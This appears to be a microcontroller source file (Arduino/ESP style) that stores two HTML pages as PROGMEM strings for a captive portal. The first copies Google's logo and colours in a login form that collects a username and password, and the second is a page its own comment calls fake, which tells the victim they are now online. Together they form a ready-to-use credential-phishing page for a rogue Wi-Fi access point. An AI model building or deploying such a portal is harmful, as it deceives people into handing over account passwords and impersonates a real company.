// Google-looking portal page
const char index_html[] PROGMEM = R"rawliteral( 
<!DOCTYPE HTML>
<html>
<head>
    <title>Login Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            max-width: 300px;
            width: 90%;
            text-align: center;
            align-items: center;
        }

        .login-container h3 {
            text-align: center;
            margin-top: 0;
        }

        .login-form {
            display: flex;
            flex-direction: column;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            margin-bottom: 10px;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        .login-form input[type="submit"] {
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #4285f4;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .login-form input[type="submit"]:hover {
            background-color: #357ae8;
        }

        .google-logo {
            width: 100px;
            margin-bottom: 20px;
            /* Adjust the size of the logo as needed */
        }
    </style>
</head>

<body>
    <div class="login-container">
        <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4" />
            <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853" />
            <path
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                fill="#FBBC05" />
            <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                fill="#EA4335" />
            <path d="M1 1h22v22H1z" fill="none" />
        </svg>
        <h3>Login Portal</h3>
        <form action="/get" class="login-form">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Login">
        </form>
    </div>
</body>

</html>
)rawliteral";

// Fake "Login success" page
const char success_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML>
<html>
<head>
  <title>Login Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f1f1f1;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .success-container {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      max-width: 300px;
      width: 90%;
      text-align: center;
    }
    .success-container h3 {
      margin-top: 0;
    }
    .success-container p {
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="success-container">
    <h3>Success</h3>
    <p>Thank you! You are now connected to the internet.</p>
  </div>
</body>
</html>
)rawliteral";